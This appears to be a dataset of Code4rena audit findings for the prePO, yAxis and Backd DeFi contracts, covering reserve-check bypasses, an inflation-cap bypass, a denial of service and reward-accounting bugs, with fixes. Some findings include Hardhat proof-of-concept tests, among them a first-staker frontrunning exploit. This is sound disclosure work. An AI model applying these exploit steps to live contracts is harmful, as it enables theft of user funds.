Alternatively you could add a default MintHook-Contract address that will always revert until it's changed to a valid one.

 

***"
190.md,PrePO NFT holders will not be able to redeem collateral,medium,"*Submitted by [0xdeadbeef0x](https://github.com/code-423n4/2022-12-prepo-findings/issues/101)*

The protocol has set a limitation on who can participate in the protocol activities.

1.  Users who are included in an allowed list: `_accountList`.
2.  Users who own specific NFTs that are supported by NFTScoreRequirement. These NFTs are PrePO NFTs that were minted to accounts that historically participated in PrePO activities.

Users who are #2 that deposited funds into the protocol are not able to redeem collateral tokens and withdraw their profits/funds from the market. (Loss of funds).

### Proof of Concept

When a user has deposited, the protocol checks if the user is permitted to participate in the protocol activities by checking #1 and #2 from the Impact section. The check is done in the `hook` function in `DepositHook`:
<https://github.com/prepo-io/prepo-monorepo/blob/3541bc704ab185a969f300e96e2f744a572a3640/apps/smart-contracts/core/contracts/DepositHook.sol#L45>

      function hook(address _sender, uint256 _amountBeforeFee, uint256 _amountAfterFee) external override onlyCollateral {
    -----
        if (!_accountList.isIncluded(_sender)) require(_satisfiesScoreRequirement(_sender), ""depositor not allowed"");
    -----
      }

After a user has deposited and received collateral tokens, he will trade it in uniswap pools to receive Long/Short tokens either manually or through the `depositAndTrade` function.

When the user decided to `redeem` through the market in order to receive the collateral tokens and his funds/profits, the user will not be able to receive it  because only users that are in the account list (#1) will pass the checks. Users who participated because they own NFT (#2) will get a revert when calling the function.

`redeem` in `PrePOMarket`:
<https://github.com/prepo-io/prepo-monorepo/blob/3541bc704ab185a969f300e96e2f744a572a3640/apps/smart-contracts/core/contracts/PrePOMarket.sol#L96>

      function redeem(uint256 _longAmount, uint256 _shortAmount) external override nonReentrant {
    -----
          _redeemHook.hook(msg.sender, _collateralAmount, _collateralAmount - _expectedFee);
    -----
      }

`hook` function in `RedeemHook`:
<https://github.com/prepo-io/prepo-monorepo/blob/3541bc704ab185a969f300e96e2f744a572a3640/apps/smart-contracts/core/contracts/RedeemHook.sol#L18>

      function hook(address sender, uint256 amountBeforeFee, uint256 amountAfterFee) external virtual override onlyAllowedMsgSenders {
        require(_accountList.isIncluded(sender), ""redeemer not allowed"");
    ----
      }

As you can see above, only users that are in the account list will be able to redeem. NFT holders will receive a revert of ""redeemer not allowed"".

#### Hardhat POC

There is an already implemented test where `hook` will revert if the user is not in the allowed list:
<https://github.com/prepo-io/prepo-monorepo/blob/3541bc704ab185a969f300e96e2f744a572a3640/apps/smart-contracts/core/test/RedeemHook.test.ts#L128>

        it('reverts if caller not allowed', async () => {
          msgSendersAllowlist.isIncluded.returns(false)
          expect(await msgSendersAllowlist.isIncluded(user.address)).to.be.false

          await expect(redeemHook.connect(user).hook(user.address, 1, 1)).to.be.revertedWith(
            'msg.sender not allowed'
          )
        })

### Tools Used

VS Code, Hardhat

### Recommended Mitigation Steps

Add an additional check in `DepositHook` to NFT holders through `NFTScoreRequirement`.








***"
190.md,`PrePOMarket.setFinalLongPayout()` shouldn't be called twice.,medium,"*Submitted by [hansfriese](https://github.com/code-423n4/2022-12-prepo-findings/issues/231), also found by [Trust](https://github.com/code-423n4/2022-12-prepo-findings/issues/307), [unforgiven](https://github.com/code-423n4/2022-12-prepo-findings/issues/203), and [cccz](https://github.com/code-423n4/2022-12-prepo-findings/issues/83)*

If `finalLongPayout` is changed twice by admin fault, the market would be insolvent as it should pay more collateral than it has.

### Proof of Concept

If `finalLongPayout` is less than `MAX_PAYOUT`, it means the market is ended and `longToken Price = finalLongPayout, shortToken Price = MAX_PAYOUT - finalLongPayout`.

So when users redeem their long/short tokens, the total amount of collateral tokens will be the same as the amount that users transferred during `mint()`.

Btw in `setFinalLongPayout()`, there is no validation that this function can't be called twice and the below scenario would be possible.

1.  Let's assume there is one user `Bob` in the market for simplicity.
2.  `Bob` transferred 100 amounts of `collateral` and got 100 long/short tokens. The market has 100 `collateral`.
3.  The market admin set `finalLongPayout = 60 * 1e16` and `Bob` redeemed 100 `longToken` and received 60 `collateral`. The market has 40 `collateral` now.
4.  After that, the admin realized `finalLongPayout` is too high and changed `finalLongPayout = 40 * 1e16` again.
5.  `Bob` tries to redeem 100 `shortToken` and receive 60 `collateral` but the market can't offer as it has 40 `collateral` only.

When there are several users in the market, some users can't redeem their long/short tokens as the market doesn't have enough `collaterals`.

### Recommended Mitigation Steps

We should modify `setFinalLongPayout()` like below so it can't be finalized twice.

```solidity
  function setFinalLongPayout(uint256 _finalLongPayout) external override onlyOwner { 
    require(finalLongPayout > MAX_PAYOUT, ""Finalized already""); //++++++++++++++++++++++++

    require(_finalLongPayout >= floorLongPayout, ""Payout cannot be below floor"");
    require(_finalLongPayout <= ceilingLongPayout, ""Payout cannot exceed ceiling"");
    finalLongPayout = _finalLongPayout;
    emit FinalLongPayoutSet(_finalLongPayout);
  }
```

  



***"
190.md,"Manager can get around min reserves check, draining all funds from Collateral.sol",medium,"*Submitted by [obront](https://github.com/code-423n4/2022-12-prepo-findings/issues/254), also found by [joestakey](https://github.com/code-423n4/2022-12-prepo-findings/issues/338), [Trust](https://github.com/code-423n4/2022-12-prepo-findings/issues/337), [wait](https://github.com/code-423n4/2022-12-prepo-findings/issues/238), [Madalad](https://github.com/code-423n4/2022-12-prepo-findings/issues/236), [hansfriese](https://github.com/code-423n4/2022-12-prepo-findings/issues/227), [deliriusz](https://github.com/code-423n4/2022-12-prepo-findings/issues/220), [rvierdiiev](https://github.com/code-423n4/2022-12-prepo-findings/issues/180), [HE1M](https://github.com/code-423n4/2022-12-prepo-findings/issues/158), [8olidity](https://github.com/code-423n4/2022-12-prepo-findings/issues/140), [zaskoh](https://github.com/code-423n4/2022-12-prepo-findings/issues/120), [hihen](https://github.com/code-423n4/2022-12-prepo-findings/issues/117), [cccz](https://github.com/code-423n4/2022-12-prepo-findings/issues/75), and [csanuragjain](https://github.com/code-423n4/2022-12-prepo-findings/issues/48)*

When a manager withdraws funds from Collateral.sol, there is a check in the `managerWithdrawHook` to confirm that they aren't pushing the contract below the minimum reserve balance.

```solidity
require(collateral.getReserve() - _amountAfterFee >= getMinReserve(), ""reserve would fall below minimum"");
```

However, a similar check doesn't happen in the `withdraw()` function.

The manager can use this flaw to get around the reserve balance by making a large deposit, taking a manager withdrawal, and then withdrawing their deposit.

### Proof of Concept

Imagine a situation where the token has a balance of 100, deposits of 1000, and a reserve percentage of 10%. In this situation, the manager should not be able to make any withdrawal.

But, with the following series of events, they can:

*   Manager calls `deposit()` with 100 additional tokens
*   Manager calls `managerWithdraw()` to pull 100 tokens from the contract
*   Manager calls `withdraw()` to remove the 100 tokens they added

The result is that they are able to drain the balance of the contract all the way to zero, avoiding the intended restrictions.

### Recommended Mitigation Steps

Include a check on the reserves in the `withdraw()` function as well as `managerWithdraw()`.








***"
190.md,Users do not receive owed tokens if `TokenSender` contract cannot cover their owed amount.,medium,"*Submitted by [trustindistrust](https://github.com/code-423n4/2022-12-prepo-findings/issues/257), also found by [Trust](https://github.com/code-423n4/2022-12-prepo-findings/issues/311), [fs0c](https://github.com/code-423n4/2022-12-prepo-findings/issues/282), [imare](https://github.com/code-423n4/2022-12-prepo-findings/issues/235), and [chaduke](https://github.com/code-423n4/2022-12-prepo-findings/issues/17)*
​

The `TokenSender.send()` method is called during the course of users withdrawing or redeeming tokens from the protocol. The method is called via `DepositHook.hook()`, `RedeemHook.hook()`, and `WithdrawHook.hook()`. These in turn are called in `prePOMarket.redeem()` or `Collateral.deposit()|.withdraw()`
​
`TokenSender.send()` contains some logic to return early without sending any of the ""outputToken"", such as if the price of the outputToken has fallen below an adjustable lower bound, or if the amount would be 0.
​
However, it also checks its own balance to see if it can cover the required amount. If it cannot, it simply doesn't send tokens. These tokens are intended to be a compensation for fees paid elsewhere in the process, and thus do represent a value loss.
​

    function send(address recipient, uint256 unconvertedAmount) external override onlyAllowedMsgSenders { 
        uint256 scaledPrice = (_price.get() * _priceMultiplier) / MULTIPLIER_DENOMINATOR;
        if (scaledPrice <= _scaledPriceLowerBound) return; 
        uint256 outputAmount = (unconvertedAmount * _outputTokenDecimalsFactor) / scaledPrice;
        if (outputAmount == 0) return;
        if (outputAmount > _outputToken.balanceOf(address(this))) return; // don't send if not enough balance
        _outputToken.transfer(recipient, outputAmount);
    }

​
The documentation in `ITokenSender.sol` states this is so the protocol doesn't halt the redeem and deposit/withdraw actions.

### Impact

The warden agrees that the protocol halting is generally undesirable.

​However, there isn't any facility in the code for the user who triggered the overage amount to be able to later receive their tokens when the contract is topped up. They must rely upon governance to send them any owed tokens. This increases centralization risks and isn't necessary.
​

Since the contract makes no attempt to track the tokens that should have been sent, manually reviewing and verifying owed tokens becomes a non-trivial task if any more than a handful of users were affected.
​

Since the user did receive their underlying collateral in any case and the loss isn't necessarily permanent, medium seems to be the right severity for this issue.

### Proof of Concept
​
Bob wants to redeem his long and short tokens via `PrePOMarket.redeem()`. However, Alice's redemption prior to his, significantly drained the `TokenSender` contract of its tokens. As a result, Bob's redemption fails to benefit him in the amount of the outputToken he should have received in compensation for the fees paid.

Because the quantity of tokens paid to Bob is partially dependent upon the token's price at the time of redemption, the protocol might shoulder more  downside loss (token price dropped compared to when Bob redeemed, must pay out more tokens) or Bob might suffer upside loss (price went up compared to time of redemption, Bob loses the difference).
​

Bob's recourse is to contact the project administrators and try to have his tokens sent to him manually. Agreeing to a value adds friction to the process.

### Recommended Mitigation Steps
​
The `TokenSender` contract should track users whose balance wasn't covered in a mapping, as well as a function for them to manually claim tokens later on if the contract's balance is topped up. 

Such a function might record the price at redemption time, or it might calculate it with the current price.




***"
56.md,`YaxisVaultAdapter.sol#withdraw()` will most certainly fail,high,"The actual token withdrawn from `vault.withdraw()` will most certainly less than the `_amount`, due to precision loss in `_tokensToShares()` and `vault.withdraw()`.

As a result, `IDetailedERC20(_token).safeTransfer(_recipient, _amount)` will revert due to insufficant balance.

Based on the simulation we ran, it will fail `99.99%` of the time unless the `pps == 1e18`.

<https://github.com/code-423n4/2021-11-yaxis/blob/146febcb61ae7fe20b0920849c4f4bbe111c6ba7/contracts/v3/alchemix/adapters/YaxisVaultAdapter.sol#L68-L72>

```solidity
function withdraw(address _recipient, uint256 _amount) external override onlyAdmin {
    vault.withdraw(_tokensToShares(_amount));
    address _token = vault.getToken();
    IDetailedERC20(_token).safeTransfer(_recipient, _amount);
}
```

<https://github.com/code-423n4/2021-11-yaxis/blob/146febcb61ae7fe20b0920849c4f4bbe111c6ba7/contracts/v3/Vault.sol#L181-L187>

```solidity
function withdraw(
    uint256 _shares
)
    public
    override
{
    uint256 _amount = (balance().mul(_shares)).div(IERC20(address(vaultToken)).totalSupply());
```

#### Recommendation

Change to:

```solidity
function withdraw(address _recipient, uint256 _amount) external override onlyAdmin {
    address _token = vault.getToken();
    uint256 beforeBalance = IDetailedERC20(_token).balanceOf(address(this));
    
    vault.withdraw(_tokensToShares(_amount));

    IDetailedERC20(_token).safeTransfer(
        _recipient,
        IDetailedERC20(_token).balanceOf(address(this)) - beforeBalance
    );
}
```"
56.md,CDP.sol update overwrites user's credit on every positive increment,high,"#### Impact

Within `CDP.sol` (<https://github.com/code-423n4/2021-11-yaxis/blob/main/contracts/v3/alchemix/libraries/alchemist/CDP.sol>) there is a function called update. This function slowly decreases the debt of a position as yield is earned, until the debt is fully paid off, and the idea is then that the credit should begin incrementing as more yield is accumulated. However, the current logic to increment the totalCredit is this line of code (line 39 of `CDP.sol`):

`\_self.totalCredit = \_earnedYield.sub(\_currentTotalDebt);`

Notice that that each time update is called, this overwrites the previous totalCredit with the incremental credit accumulated. The line should instead be:

`\_self.totalCredit = \_self.totalCredit.add(\_earnedYield.sub(\_currentTotalDebt));`

Indeed, look at the function `getUpdatedTotalCredit`, it returns the value:

`\_self.totalCredit + (\_unclaimedYield - \_currentTotalDebt);`

So it is obviously intended that the `totalCredit` should keep increasing over time instead of being overwritten on each update with a small value. The impact of this issue is large - the credit of every position will always be overwritten and the correct information will be lost forever. User's credit should grow over time, but instead it is overwritten with a small value every time update is called.

#### Proof of Concept

See line 39 in `CDP.sol` here: <https://github.com/code-423n4/2021-11-yaxis/blob/main/contracts/v3/alchemix/libraries/alchemist/CDP.sol#:~:text=_self.totalCredit%20%3D%20_earnedYield.sub(_currentTotalDebt)%3B>

#### Tools Used

Manual inspection.

#### Recommended Mitigation Steps

Change code as described above to increment `totalCredit` instead of overwrite it."
56.md,Prevent Minting During Emergency Exit,medium,"#### Impact

Potential increased financial loss during security incident.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-yaxis/blob/0311dd421fb78f4f174aca034e8239d1e80075fe/contracts/v3/alchemix/Alchemist.sol#L611>

Consider a critical incident where a vault is being drained or in danger of being drained due to a vulnerability within the vault or its strategies.

At this stage, you want to trigger emergency exit and users want to withdraw their funds and repay/liquidate to enable the withdrawal of funds. However, minting against debt does not seem like a desirable behaviour at this time. It only seems to enable unaware users to get themselves into trouble by locking up their funds, or allow an attacker to do more damage.

#### Recommended Mitigation Steps

Convert emergency exit check to a modifier, award wardens who made that suggestion, and then apply that modifier here.

Alternatively, it is possible that the team might want to allow minting against credit: users minting against credit would effectively be cashing out their rewards. This might be seen as desirable during emergency exit, or it might be seen as a potential extra source of risk. If this is desired, then the emergency exit check could be placed at line 624 with a modified message, instructing users to only use credit."
131.md,`Minter.sol#startInflation()` can be bypassed.,high,"<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L104-L108>

```solidity
    function startInflation() external override onlyGovernance {
        require(lastEvent == 0, ""Inflation has already started."");
        lastEvent = block.timestamp;
        lastInflationDecay = block.timestamp;
    }
```

As `lastEvent` and `lastInflationDecay` are not initialized in the `constructor()`, they will remain to the default value of `0`.

However, the permissionless `executeInflationRateUpdate()` method does not check the value of `lastEvent` and `lastInflationDecay` and used them directly.

As a result, if `executeInflationRateUpdate()` is called before `startInflation()`:

1.  L190, the check of if `_INFLATION_DECAY_PERIOD` has passed since `lastInflationDecay` will be `true`, and `initialPeriodEnded` will be set to `true` right away;
2.  L188, since the `lastEvent` in `totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));` is `0`, the `totalAvailableToNow` will be set to `totalAvailableToNow ≈ currentTotalInflation * 52 years`, which renders the constrains of `totalAvailableToNow` incorrect and useless.

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L115-L117>

```solidity
    function executeInflationRateUpdate() external override returns (bool) {
        return _executeInflationRateUpdate();
    }
```

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L187-L215>

```solidity
    function _executeInflationRateUpdate() internal returns (bool) {
        totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));
        lastEvent = block.timestamp;
        if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {
            currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);
            if (initialPeriodEnded) {
                currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(
                    annualInflationDecayKeeper
                );
                currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(
                    annualInflationDecayAmm
                );
            } else {
                currentInflationAmountKeeper =
                    initialAnnualInflationRateKeeper /
                    _INFLATION_DECAY_PERIOD;

                currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;
                initialPeriodEnded = true;
            }
            currentTotalInflation =
                currentInflationAmountLp +
                currentInflationAmountKeeper +
                currentInflationAmountAmm;
            controller.inflationManager().checkpointAllGauges();
            lastInflationDecay = block.timestamp;
        }
        return true;
    }
```

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L50-L51>

```solidity
    // Used for final safety check to ensure inflation is not exceeded
    uint256 public totalAvailableToNow;
```

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L217-L227>

```solidity
    function _mint(address beneficiary, uint256 amount) internal returns (bool) {
        totalAvailableToNow += ((block.timestamp - lastEvent) * currentTotalInflation);
        uint256 newTotalMintedToNow = totalMintedToNow + amount;
        require(newTotalMintedToNow <= totalAvailableToNow, ""Mintable amount exceeded"");
        totalMintedToNow = newTotalMintedToNow;
        lastEvent = block.timestamp;
        token.mint(beneficiary, amount);
        _executeInflationRateUpdate();
        emit TokensMinted(beneficiary, amount);
        return true;
    }
```

### Recommendation

Consider initializing `lastEvent`, `lastInflationDecay` in `constructor()`.

or

Consider adding `require(lastEvent != 0 && lastInflationDecay != 0, ""..."")` to `executeInflationRateUpdate()`.

 




***"
131.md,Total Supply is not guaranteed and is not deterministic.,high,"The actual total supply of the token is random and depends on when `_executeInflationRateUpdate` is executed.

### Proof of Concept

The `README` and tokenomic documentation clearly states that “The token supply is limited to a total of 268435456 tokens.” However when executing [`_executeInflationRateUpdate`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/Minter.sol#L181), it first uses the current inflation rate to update the total available before checking if it needs to be reduced.

Therefore if no one mints or calls `executeInflationRateUpdate` for some time around the decay point, the inflation will be updated using the previous rate so the  `totalAvailableToNow` will grow too much.

### Mitigation Steps

You should do

```js
totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));
```

Only if the condition `block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD` is false.

Otherwise you should do

```js
totalAvailableToNow += (currentTotalInflation * (lastInflationDecay + _INFLATION_DECAY_PERIOD - lastEvent));
```

Then update the rates, then complete with

```js
totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastInflationDecay + _INFLATION_DECAY_PERIOD));
```

Note that as all these variables are either constants either already loaded in memory this is super cheap to do.





***"
131.md,DoS on KeeperGauge due to division by zero,medium,"In the **\_calcTotalClaimable()** function it should be validated that perPeriodTotalFees\[i] != 0 since otherwise it would generate a DoS in **claimableRewards()** and **claimRewards()**.<br>
This would be possible since if **advanceEpoch()** or **kill()** is executed by the InflationManager address, the epoch will go up without perPeriodTotalFees\[newIndexEpoch] is 0.<br>
The negative of this is that every time the **InflationManager** executes these two methods (**kill() and advanceEpoch()**) DoS is generated until you run **reportFees()**.<br>
Another possible case is that **kill()** or **advanceEpoch()** are executed 2 times in a row and there is no way of a perPeriodTotalFees\[epoch-1] updating its value, therefore it would be an irreversible DoS.<br>

### Recommended Mitigation Steps

Generate a behavior for the case that perPeriodTotalFees\[i] == 0.

 




***"
131.md,The first AMM Staker will have control over how the shares are calculated.,medium,"<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L147>

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L154>

### Impact

The first staker can take control of how the subsequent shares are going to be distributed by simply staking 1wei amount of the token and frontrunning future stakers. The reasons of this are related on how the variables are updated and with the amounts that the Gauge allows users to stake (anything but zero). The origin of this vulnerability relies on the evaluation of the `totalStaked` variable on its inception.

### Proof of Concept

To illustrate this attack, an environment of testing was made in order to track the token flows and how the variables are being updated and read.

The initial or border conditions taken into account are the same as the ones used by the team to perform the tests and just a few assumptions and simplifications were taken.

1.  The inflation rate is fixed for simplicity (`0.001`). This is valid within a short period of time because it is not a function of how the tokens are distributed or their flows. By tracking how the inflation rate is calculated an updated, we see that it is managed by the `currentInflationAmountAmm` within the [`Minter.sol` contract](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L184), which value is modified by `_executeInflationRateUpdate()` three lines below the last code permalink. Its value depends on non-token balance related parameters (such as inflation decays and annual rates).
2.  For the testing environment performed by the team, a DummyERC20 was used as testing token. The same is done on the exploit environment.
3.  The controller is not used because it is used to retrieve the inflation rate and it is now fixed because of 1).

Each user state is updated whenever he calls either `stake`, `unstake` or `claimRewards`.

Steps:

*   Alice is the first staker and deposits 1wei worth of DummyERC20.
*   Bob takes one day to find out this new protocol and decides to stake 10 ETH amount of tokens (`10 * 10**decimals()`).
*   Alice, who was scanning the mempool, frontruns Bob with the same amount he was willing to stake. Her txn is mined first.
*   Then Bobs' transaction is mined for the 10 ETH worth.
*   Sometime after this, the pool is checkpointed.
*   A few days pass, and Bob wants to stake even more tokens. The same amount as before.
*   Alice frontruns him again updating her shares.
*   Bobs' transaction is mined and his shares are also updated.
*   The pool is checkpointed again. And Alice managed to increase considerably her amount of shares.

Both cases were evaluated (with and without staking 1 wei first). The attack scenario outputs a 100% more shares to Alice than Bob in comparison with the ethical/non-attack situation.

The code used to perform this test is the following:

    it(""First Depositer Exploit"", async function () {
            let userShares = []
            let userIntegral = []
            let userBalance = []

            let globalIntegral, totalStaked;
            let aliceBob = [alice, bob];

            // Starting Checkpoint
            await this.ammgauge.poolCheckpoint();
            await ethers.provider.send(""evm_increaseTime"", [1 * 24 * 60 * 60]); // 10 days
            
            const updateStates = async () => { 
                userShares = []
                userIntegral = []
                userBalance = []
                for (const user of aliceBob) {
                    let balances = ethers.utils.formatEther(await this.ammgauge.balances(user.address));
                    let currentShare = ethers.utils.formatEther(await this.ammgauge.perUserShare(user.address));
                    let currentStakedIntegral = ethers.utils.formatEther(await this.ammgauge.perUserStakedIntegral(user.address));
                    userShares.push(currentShare);
                    userIntegral.push(currentStakedIntegral);
                    userBalance.push(balances);
                }
                globalIntegral = await this.ammgauge.ammStakedIntegral()
                totalStaked = await this.ammgauge.totalStaked()
                console.log(""  "")
                console.log(""         ALICE / BOB"");
                console.log(`Shares: ${userShares}`);
                console.log(`Integr: ${userIntegral}`);
                console.log(`Balanc: ${userBalance}`);
                console.log(""  "")
                console.log(""Global"")
                console.log(`Integral: ${ethers.utils.formatEther(globalIntegral)}, TotalStaked: ${ethers.utils.formatEther(totalStaked)}`)
            }

            const stake = async (to, amount) => {
                await updateStates()
                console.log("" "")
                // Balance before
                let balanceBefore = await this.ammgauge.balances(to.address);
                // Stake
                await this.ammgauge.connect(to).stake(amount);
                expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.add(amount));
                // await updateStates();
                console.log("" "")
            }

            const unstake = async (to, amount) => {
                await updateStates()
                console.log("" "")
                // Balance before
                let balanceBefore = await this.ammgauge.balances(to.address);
                // Stake
                await this.ammgauge.connect(to).unstake(amount);
                expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.sub(amount));
                await updateStates();
                console.log("" "")
            }

            // HERE IS WHERE THE SIMULATION IS PERFORMED
            let simulationTimes = 2;
            let withOneWeiDeposit = true;

            if (withOneWeiDeposit) {
                // Alice deposits first
                console.log(""Alice Deposits 1wei"")
                let firstUserDeposit = ethers.utils.parseEther(""1"");
                await stake(alice, 1);
            }

            for (let index = 1; index <= simulationTimes; index++) {
                console.log("" "")
                console.log(`Loop number ${index}`);
                console.log("" "")

                console.log(""A day passes until Bob decides to deposit"")
                await ethers.provider.send(""evm_increaseTime"", [1 * 24 * 60 * 60]); // 1 days

                console.log("" "")
                console.log(""She scans that Bob is about to stake 10. So decides to frontrun him."")
                console.log(""Alice Frontruns"")
                let frontrunAmount = ethers.utils.parseEther(""10"");
                await stake(alice, frontrunAmount);

                console.log("" "")
                console.log(""Bob stakes 10 tokens"")
                await stake(bob, frontrunAmount)

                // A few days pass
                await ethers.provider.send(""evm_increaseTime"", [1 * 24 * 60 * 60]); // 2 days
                // The pool is checkpointed
                await this.ammgauge.poolCheckpoint();
                console.log(""After 1 day the pool is checkpointed"")
                await updateStates()

            }
        })

The simulation was both made for the attacked and non attacked situations.
The values that are shown represent how the contract updates them (the `totalStaked` variable is 0 when first Alice calls the stake function after `_userCheckpoint()` rans)

#### WITH 1WEI STAKE (ATTACK)

| time |                Situation               |  totalStaked  | Alice Shares | Bob Shares |
| :--: | :------------------------------------: | :-----------: | :----------: | :--------: |
|  0-  |          First poolCheckpoint          |       0       |       0      |      0     |
|  0+  |           Alice Deposits 1wei          |       0       |       0      |      0     |
|   1  |       Alice frontruns Bob @ 10eth      |      1wei     |       0      |      0     |
|   2  |         Bob 10eth txn is mined         |  10eth + 1wei |     86.4     |      0     |
|   3  | 1 day later poolCheckpoint() is called | 20eth + 1 wei |     86.4     |      0     |
|   4  |        Alice frontruns Bob again       | 20eth + 1 wei |     86.4     |      0     |
|   5  |         Bob 10eth txn is mined         |  30eth + 1wei |     172.8    |      0     |
|   6  | 1 day later poolCheckpoint() is called |  40eth + 1wei |     172.8    |    86.4    |

#### WITHOUT THE 1WEI STAKE (No ""first staker hijack"")

| time |                Situation               | totalStaked | Alice Shares | Bob Shares |
| :--: | :------------------------------------: | :---------: | :----------: | :--------: |
|  0-  |          First poolCheckpoint          |      0      |       0      |      0     |
|  0+  |           Alice stakes 10eth           |      0      |       0      |      0     |
|   1  |            Bob stakes 10eth            |    10eth    |       0      |      0     |
|   2  | 1 day later poolCheckpoint() is called |    20eth    |       0      |      0     |
|   3  |           Alice stakes 10eth           |    20eth    |       0      |      0     |
|   4  |            Bob stakes 10eth            |    30eth    |     86.4     |      0     |
|   5  | 1 day later poolCheckpoint() is called |    40eth    |     86.4     |    86.4    |

### Recommended Mitigation Steps

Further evaluation on how the variables are updated and how does the `Integral` (both each users and global one) is calculated on the pool inception is needed to patch this issue.

 




***"
131.md,THE first AMM Staker may not receive according rewards because of poor checkpoints,medium,"<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L56>

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L140>

### Impact

The first staker within the `AmmGauge` may not get the rewards if the pool is not checkpointed right after he stakes and before he wants to claim the rewards.

### Proof of Concept

A testing environment that reproduces how the protocol is going to be deployed and managed is used to evaluate this case under the following assumptions and simplifications.

1.  The inflation rate is fixed for simplicity (`0.001`).
2.  For the testing environment performed by the team, a DummyERC20 was used as testing token. The same is done on the exploit environment.
3.  The minting of tokens impact both on the inflation calculation and their balance. But this test evaluates the states just before minting (claimable balances). Following how the pools are updated, they are checkpointed in the end of the `_executeInflationRateUpdate` call. Not while staking.

In order to illustrate this scenario we will show both the vulnerable and non vulnerable situations.

Vulnerable Situation:

1.  Alice, Bob, Charlie and David are future users of the pool. They all notice the inception of this project and decide to stake.
2.  They all stake the same amount. Their transactions are mined with 1min of difference starting from Alice and finishing with David.
3.  There is no external pool checkpoint between Alice and Bob (besides the one that is triggered when Bob stakes).
4.  Sometime happens and they all want to check their accumulated reward balance. Alice accumulated much less than the others.

Non Vulnerable Situation:

*   The same as before but calling externally `_poolCheckpoint()` between Alice stake call and Bobs' and before checking the accumulated rewards.

The code to show this has a `secureCheckpoints` toggle that can be set as true or false to trigger (or not) the intermediate poolCheckpoints.

        it('First Staker Rewards Calculation', async function () { 
            
            let secureCheckpoints = false;
            let currentShare, currentStakedIntegral, balances;
            await this.ammgauge.poolCheckpoint();
            await ethers.provider.send(""evm_increaseTime"", [1 * 24 * 60 * 60]); // 10 days
            
            const updateStates = async (from) => { 
                currentShare = await this.ammgauge.perUserShare(from.address);
                currentStakedIntegral = await this.ammgauge.perUserStakedIntegral(from.address);
                balances = await this.ammgauge.balances(from.address);
            }

            const stake = async (to, amount) => {
                await updateStates(to)
                console.log("" "")
                // Balance before
                let balanceBefore = await this.ammgauge.balances(to.address);
                // Stake
                await this.ammgauge.connect(to).stake(amount);
                expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.add(amount));
                await updateStates(to);
                console.log("" "")
            }

            const unstake = async (to, amount) => {
                await updateStates(to)
                console.log("" "")
                // Balance before
                let balanceBefore = await this.ammgauge.balances(to.address);
                // Stake
                await this.ammgauge.connect(to).unstake(amount);
                expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.sub(amount));
                await updateStates(to);
                console.log("" "")
            }

            // Each user stakes tokens
            let initialStaking = ethers.utils.parseEther(""10"")
            console.log("" "")
            console.log(""USERS STAKE"");
            for (const user of users) {
            await stake(user, initialStaking)
            if(secureCheckpoints){await this.ammgauge.poolCheckpoint()};
            await ethers.provider.send(""evm_increaseTime"", [60 * 60]); // 1hr between stakes
            }
            console.log("" "")

            await ethers.provider.send(""evm_increaseTime"", [ 5 * 24 * 60 * 60]); // 5 days
            if(secureCheckpoints){await this.ammgauge.poolCheckpoint()};

            let claimableRewards = [];
            let claimedRewards = [];
            console.log("" "")
            console.log(""USERS CLAIMABLE REWARDS AFTER 5 days"");
            console.log("" "")
            for (const user of users) {
                let stepClaimable = await this.ammgauge.claimableRewards(user.address);
                claimableRewards.push(ethers.utils.formatEther(stepClaimable))

                let rewardsClaim = await (await this.ammgauge.claimRewards(user.address)).wait()
                claimedRewards.push(ethers.utils.formatEther(rewardsClaim.logs[0][""data""]))
            }

            console.log(""Claimable calculated"")
            console.log(""   ALICE - BOB -  CHARLIE - DAVID"")
            console.log(claimableRewards)

            console.log("" "")
            console.log(""Effectively Claimed"")
            console.log(""   ALICE - BOB -  CHARLIE - DAVID"")
            console.log(claimableRewards)
        })

The outputs for both cases are shown on the following chart. The initial staking amount is 10eth amount of the DummyERC20 token.

|         | Without Checkpoints | With Checkpoints |
| :-----: | :-----------------: | :--------------: |
|  Alice  |         6.6         |       115.5      |
|   Bob   |        111.9        |       111.9      |
| Charlie |        110.1        |       110.1      |
|  David  |        108.9        |       108.9      |

### Recommended Mitigation Steps

*   Check how is calculated the staking variables while the pool has no tokens staked and also how the updates and checkpoints are performed.






***"
